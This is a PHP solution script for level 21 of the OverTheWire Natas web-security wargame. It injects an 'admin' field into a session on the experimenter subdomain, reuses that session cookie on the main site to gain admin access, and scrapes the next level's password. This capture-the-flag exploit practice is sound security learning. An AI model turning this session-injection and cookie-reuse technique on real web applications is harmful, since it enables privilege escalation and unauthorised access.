<?php
require_once dirname(__DIR__) . '/bootstrap.php';

use GuzzleHttp\Cookie\CookieJar;
use GuzzleHttp\Cookie\setCookie;

$level = 21;
$username = 'natas' . $level;
$password = readFlag($level - 1);
$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);
$experimenter = sprintf('http://%s-experimenter.natas.labs.overthewire.org/?debug=true', $username);

$response = $client->request('POST', $experimenter, [
    'auth' => [$username, $password],
    'form_params' => [
        'submit' => 'submit',
        'admin' => 1,
    ]
]);

$cookies = $client->getConfig('cookies');
$sessionId = $cookies->toArray()[0]['Value'];

$jar = new CookieJar();
$jar->setCookie(new SetCookie([
    'Name' => 'PHPSESSID',
    'Value' => $sessionId, //use session of natas21-experimenter
    'Domain' => 'natas21.natas.labs.overthewire.org',
]));

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'cookies' => $jar
]);

$body = (string)$response->getBody();
preg_match('/Password: (.*)<\/pre>/', $body, $flag);
echo $flag[1];
